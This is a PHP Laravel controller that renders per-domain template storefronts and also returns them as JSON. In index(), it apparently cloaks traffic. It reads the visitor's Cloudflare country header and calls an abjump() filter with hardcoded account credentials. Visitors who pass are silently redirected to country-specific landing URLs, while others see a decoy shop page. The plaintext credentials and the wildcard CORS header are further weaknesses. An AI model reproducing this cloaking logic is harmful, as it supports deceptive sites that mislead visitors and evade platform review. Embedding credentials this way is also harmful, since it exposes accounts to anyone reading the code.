<?php

namespace App\Http\Controllers;

use App\Models\Article;
use App\Models\Banner;
use App\Models\Country;
use App\Models\LandingLink;
use App\Models\Mailbox;
use App\Models\License;
use App\Models\Goods;
use App\Models\Site;
use App\Models\Template;
use Illuminate\Support\Facades\Log;

class IndexController extends Controller
{
    public function index(){
        //检测是否许可的域名
        $site = Site::select()->where('domain', '=', $_SERVER['HTTP_HOST'])->first();
        if (empty($site)){
            return view('404');
        }

        $headers = getallheaders();
        $country = isset($headers['Cf-Ipcountry']) ? $headers['Cf-Ipcountry'] : '';
        if ($country){
            $country = Country::select('id', 'country_code')->where('country_code', 'like', "%$country%")->first();

            if ($country) {
                $link = LandingLink::select('url')->where('country_id', '=', $country->id)->where('flag', '=', 1)->orderBy('top', 'desc')->first();
                if ($link) {
                    $data = [
                        'account'   =>  'ab1198',                   //用户名
                        'pwd'       =>  'ab1198@0302',              //密码
                        'zone'      =>  $country->country_code,     //投放的国家地区，ALL为全可以访问，留空为全部不允许
                        'mobile'    =>  '0',                        //1为只允许手机 2为只允许pc 0为不限制
                        'systemlang'=>  '',                         //系统语言
                        'ip_white'  =>  '',
                        'ip_black'  =>  '',
                        'source'    =>  '',                         //来源
                    ];
                    if(abjump($data)){
                        header("location:$link->url");
                    }
                }
            }
        }

        //匹配模板
        $template = Template::find($site['template_id']);
        if (empty($template)){
            return view('404');
        }

        //获取执照，商品，文章
        //1获取指定商品包括分类的完整collection
        $license = License::find($site['license_id']);
        $goodsId = explode(',', $site['goods_id']);
        $articleId = explode(',', $site['article_id']);
        $goods = Goods::select()->whereIn('id', $goodsId)->get();
        $article = Article::select()->whereIn('id', $articleId)->get();
        $mailbox = Mailbox::find($site['email_id']);
        $banner = Banner::find($site['banner_id']);

        $goodsCate = [];
        foreach ($goods as $itme){
            $goodsCate[] = $itme->category;
        }

        $banner['banner'] = config('filesystems.disks.admin.url').'/'.$banner->banner;
        $license['logo'] = config('filesystems.disks.admin.url').'/'.$license->logo;

        foreach ($goods as $itme){
            $itme['thumbnail'] = config('filesystems.disks.admin.url').'/'.$itme->thumbnail;
        }

        $data = [
            'license' => $license,
            'goods'   => $goods,
            'goodsCategory'   => array_unique($goodsCate),
            'article'   => $article,
            'mailbox'=> $mailbox,
            'banner'=>$banner,
            'site'=>$site,
        ];

        return view(str_replace('.blade.php', '', $template['template']), $data);
    }

    public function get(){
        header("Access-Control-Allow-Origin: *");

        //检测是否许可的域名
        $domain = str_replace('http://','',$_SERVER['HTTP_ORIGIN']);
        $site = Site::select()->where('domain', '=', $domain)->first();
        if (empty($site)){
            return json_encode([
                'code' => 0,
                'msg'  => 'Illegal Domain',
                'data' => '',
            ], JSON_FORCE_OBJECT);
        }

        //获取执照，商品，文章
        //1获取指定商品包括分类的完整collection
        $license = License::select('id', 'title', 'address', 'about', 'logo', 'banner')->find($site['license_id']);
        $goodsId = explode(',', $site['goods_id']);
        $articleId = explode(',', $site['article_id']);
        $goods = Goods::select('id', 'title', 'description', 'content', 'price', 'thumbnail', 'category_id')->whereIn('id', $goodsId)->get();
        $article = Article::select()->whereIn('id', $articleId)->get();
        $mailbox = Mailbox::find($site['email_id']);
        $banner = Banner::find($site['banner_id']);

        $goodsCate = [];
        foreach ($goods as $itme){
            $goodsCate[] = $itme->category;
        }

        $banner['banner'] = config('filesystems.disks.admin.url').'/'.$banner->banner;
        $license['logo'] = config('filesystems.disks.admin.url').'/'.$license->logo;

        foreach ($goods as $itme){
            $itme['thumbnail'] = config('filesystems.disks.admin.url').'/'.$itme->thumbnail;
        }

        $data = [
            'license' => $license,
            'goods'   => $goods,
            'goodsCategory'   => array_unique($goodsCate),
            'article'   => $article,
            'mailbox'=> $mailbox,
            'banner'=>$banner,
            'site'=>$site,
        ];

        return json_encode([
            'code' => 1,
            'msg'  => 'Request Success',
            'data' => $data,
        ], JSON_FORCE_OBJECT);
    }
}
